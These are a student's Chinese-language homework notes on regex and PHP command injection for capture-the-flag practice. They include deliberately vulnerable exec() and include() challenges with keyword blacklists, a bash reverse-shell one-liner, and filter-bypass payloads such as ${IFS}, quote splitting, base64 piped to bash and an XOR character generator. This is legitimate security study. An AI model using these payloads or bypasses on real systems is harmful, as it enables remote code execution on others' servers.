# web第二节作业

[TOC]

----

> @Author:张博翔 bx

## 正则表达式练习

![image-20240810101930499](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240810101930499.png)

总的来说比较顺利！

### 之前做的笔记

> 正则表达式（Regular Expression，简称regex或regexp）是一种用于匹配字符串中字符模式的特殊字符序列。它是一种强大的工具，可以用来进行文本搜索、替换和验证等操作。正则表达式广泛应用于编程、数据处理和文本分析等领域。

**字符**：普通字符（如字母、数字）匹配它们自己。例如，正则表达式`a`匹配字符串中的字母`a`。

**元字符**：具有特殊含义的字符。例如：

- `.`：匹配除换行符以外的任意单个字符。
- `^`：匹配字符串的开头。
- `$`：匹配字符串的结尾。
- `*`：匹配前面的元素零次或多次。
- `+`：匹配前面的元素一次或多次。
- `?`：匹配前面的元素零次或一次。
- `[]`：定义一个字符类，匹配方括号中的任意一个字符。
- `|`：表示“或”操作符。
- `()`：用于分组，提取子模式。
- `\`：转义字符，用于匹配元字符本身或表示特殊序列。

-----

比如*him*,*history*,*high*等等。用hi来查找的话，这里边的*hi*也会被找出来。如果要精确地查找hi这个单词的话，我们应该使用`\bhi\b`。

`\b`是正则表达式规定的一个特殊代码（好吧，某些人叫它**元字符，metacharacter**），代表着单词的开头或结尾，也就是单词的分界处。虽然通常英文的单词是由空格，标点符号或者换行来分隔的，但是\b并不匹配这些单词分隔字符中的任何一个，它**只匹配一个位置**。

**基本规则---重复**

| 代码/语法 | 说明             |
| --------- | ---------------- |
| *         | 重复零次或更多次 |
| +         | 重复一次或更多次 |
| ?         | 重复零次或一次   |
| {n}       | 重复n次          |
| {n,}      | 重复n次或更多次  |
| {n,m}     | 重复n到m次       |

----

## 关于exec()和system（）的思考

```php
system("whoami")
```

有回显

```php
<?php
exec("whoami");
//没有什么显示

//我们可以采取dump输出出来
var_dump(exec("whoami"));
```

### 看一道题目

```php
<?php
highlight_file(__FILE__);
$command=$_POST['cmd'];
if(isset($command)){
    if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $command)){
        exec($command);
    }
    else{
        die("what are you doing?");
    }
}
?>
```

采用`exec()`来执行命令

- 反弹shell

```bash
bash -c "bash -i >& /dev/tcp/ip <&1"
```

- curl、wget、dns外带

- 制到网站根目录利用`cp`
- Bash盲注入---这个需要自己用Python写脚本不断练习，还在学习中

## 基本字典思路

### 多个命令执行

- `;`
- `\n   (%0a)`



### 空格Bypass

在过滤了空格的系统中，以cat flag.txt为例，系统不允许我们输入空格或输入后被过滤。

- **${IFS}**

可使用${IFS}代替空格。

```php
cat${IFS}flag.txt
cat$IFS$1flag.txt
cat${IFS}$1flag.txt
```

- **重定向符绕过(<>)**

```php
cat<>flag.txt
cat<flag.txt
```

- **%09(需要php环境)**

php环境下web输入%09等效于空格

```php
cat%09flag.txt
```

- **`%0a`换行符**



### 文件读取

(1)more:一页一页的显示档案内容
(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页
(3)head:查看头几行
(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
(5)tail:查看尾几行
(6)nl：显示的时候，顺便输出行号
(7)od:以二进制的方式读取档案内容
(8)vi:一种编辑器，这个也可以查看
(9)vim:一种编辑器，这个也可以查看
(10)sort:可以查看
(11)uniq:可以查看
(12)file -f:报错出具体内容



## 关键字Bypass

### 单双引号

- 单引号----`''`
- 双引号---`""`
- 反斜杠--- `\`

我们可以通过`ca''t ca""t c"a"t ca\t`这样来bypass



### 编码绕过

#### Base64

```php
echo xxxx|base64 -d|bash
```

1. 使用反引号包含base64解码后的命令

```php
echo "Y2F0IGZsYWcudHh0Cg==" | base64 -d
```

2. 将base64解码后的命令通过管道符传递给bash

```php
echo "Y2F0IGZsYWcudHh0Cg==" | base64 -d | bash
```



### 变量拼接

使用shell变量拼接被黑名单限制的关键词

```php
a=c;b=at;c=fl;d=ag;e=.txt;$a$b $c$d$e;
```



### 通配符绕过

- `?`通配符匹配单个字母
- `*`通配符匹配多个字母
- `[x-x]` or  `{x,x,x,x}`



### $1

```php
ca$1t fl$1ag.t$1xt
```



### 异或脚本php

> 获取于网上的资源

```python
import re

def main():
    contents = ""
    
    # Iterate over the range 0 to 255 for both i and j
    for i in range(256):
        for j in range(256):
            hex_i = f"{i:02x}"  # Convert i to a 2-digit hex
            hex_j = f"{j:02x}"  # Convert j to a 2-digit hex
            
            # Regex pattern to filter out certain characters
            pattern = r'[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;'
            
            # Decode hex values and check against the regex pattern
            if re.search(pattern, bytes.fromhex(hex_i).decode('latin1')) or \
               re.search(pattern, bytes.fromhex(hex_j).decode('latin1')):
                continue  # Skip if the character matches the pattern
            
            a = f"%{hex_i}"
            b = f"%{hex_j}"
            c = chr(ord(bytes.fromhex(hex_i).decode('latin1')) ^ ord(bytes.fromhex(hex_j).decode('latin1')))
            
            if 32 <= ord(c) <= 126:  # Check if the character is printable
                contents += f"{c} {a} {b}\n"
    
    # Write contents to the text file
    with open("text.txt", "w") as myfile:
        myfile.write(contents)

if __name__ == "__main__":
    main()
```







```
<?php
highlight_file(__FILE__);
    if(!preg_match("/<|\?|php|>|echo|filter|system|file|%|&|=|`|eval/i",$_GET['data'])){
        include $_GET['data'];
    }else{
    	die("dangerous function detect!");
    };
?>
```

